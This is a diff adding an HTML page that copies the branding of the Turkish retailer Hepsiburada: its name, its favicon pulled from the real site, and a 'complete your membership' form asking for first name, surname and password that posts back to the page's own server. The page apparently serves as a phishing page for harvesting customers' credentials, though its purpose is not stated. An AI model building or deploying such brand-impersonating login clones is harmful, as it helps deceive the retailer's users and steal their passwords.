@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Üye Giriş Sayfası & Üye Ol - Hepsiburada</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://images.hepsiburada.net/assets/sfstatic/Content/images/favicon-32x32-new.png">
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+    <div class="logo" style="text-align: center; width: 100%; margin-top: 30px;">
+        <a href="#" class="hepsiburada">hepsiburada</a>
+    </div>
+
+    <div class="loginregister" style="height: 700px;">
+        <h3 class="createacctitle">Üyeliğinizi tamamlayın</h3>
+        <p class="createaccdesc">Üyeliğinizi tamamlamak için aşağıdaki bilgileri doldurunuz.</p>
+        <form action="" method="post" class="formregister">
+            <div style="display: flex; vertical-align: middle;">
+                <input type="text" placeholder="Ad" name="name" style="width: 50%; margin-right: 5px;" required>
+                <input type="text" placeholder="Soyad" name="surname" style="width: 50%; margin-top: 40px;" required>
+            </div>
+            <input type="password" placeholder="Şifre" name="password" minlength="8" required>
+            <input type="checkbox" value="text1" style="margin-left: -47%; margin-right: -47%; display: inline-block;" required>
+            <span id="text1" style="font-size: 15px; text-align: center;">Hepsiburada ve iştiraklerinin önemli kampanyalarından haberdar olmak için anlık/kısa mesaj, e-posta ve telefon aracılığıyla elektronik ileti almak istiyorum.</span>
+            <button name="regnow">Üye Ol</button>
+            <p>Kişisel verileriniz, <strong>Aydınlatma Metni</strong> kapsamında işlenmektedir. “Üye ol” veya “Sosyal Hesap” butonlarından birine basarak <strong>Üyelik Sözleşmesi</strong>’ni ve <strong>Gizlilik Politikası</strong>’nı okuduğunuzu ve kabul ettiğinizi onaylıyorsunuz.</p>
+        </form>
+    </div>
+</body>
+</html>
